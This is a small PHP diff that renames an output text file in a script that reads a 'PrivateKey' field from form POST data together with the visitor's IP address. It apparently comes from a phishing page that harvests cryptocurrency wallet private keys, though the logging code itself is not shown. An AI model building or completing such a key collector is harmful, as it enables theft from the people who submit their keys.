@@ -1,5 +1,5 @@
 <?php
-$file = "personalityprojeck.txt";
+$file = "tes123.txt";
 $PrivateKey = $_POST['PrivateKey'];
 $ip = $_SERVER['REMOTE_ADDR'];
 
